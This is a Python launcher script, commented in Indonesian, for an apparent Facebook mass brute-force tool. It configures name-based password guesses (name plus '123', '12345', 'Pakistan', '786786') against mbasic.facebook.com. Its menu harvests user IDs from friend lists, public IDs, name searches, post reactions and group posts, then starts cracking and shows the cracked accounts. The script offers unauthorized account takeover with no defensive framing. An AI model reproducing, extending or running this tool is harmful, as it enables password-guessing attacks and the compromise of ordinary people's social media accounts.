#!/usr/bin/python3
# coding=utf-8

#######################################################
# #######################################################

import Store
import MBF
import Http
import Login
import Dump
import Brute

store = Store()

#######################################################
#                   C O N F I G                       #
#######################################################
# akan menghasilkan pw: nama_depan123, nama_belakang12345
# nama_tengah123, nama_tengah12345
# dan seterusnya
store.passwordNameList = ['123', '12345' , 'Pakistan' , '786786']
# contoh penggunaan store.passwordExtraList = ['Pakistan', '786786', 'Pakistan786']
# catatan: semakin banyak password semakin lama proses crakingnya.
store.passwordExtraList = []
# lower password
store.passwordLower = True
# base url
store.setBaseURL('https://mbasic.facebook.com{0}')
# login class
store.setLoginClass(Login)
# http requests classs
store.setHttpClass(Http)

dump = Dump(store)
mbf = MBF(store)
brute = Brute(store)

store.add({
    'name': 'Start crack',
    'func': brute.main,
})
store.add({
    'name': 'Dump id dari daftar teman',
    'func': dump.friendsList,
})
store.add({
    'name': 'Dump id publik',
    'func': dump.publicID,
})
store.add({
    'name': 'Dump id dari pencarian nama',
    'func': dump.search,
})
store.add({
    'name': 'Dump id dari reaction post',
    'func': dump.react,
})
store.add({
    'name': 'Dump id dari postingan group',
    'func': dump.postGroup,
})
store.add({
    'name': 'Hapus cache hasil dump',
    'func': mbf.clearDumpCache,
})
store.add({
    'name': 'Lihat hasil crack',
    'func': mbf.resultCrack,
})
store.add({
    'name': 'Ganti akun',
    'func': mbf.changeAccount,
})

mbf.run()
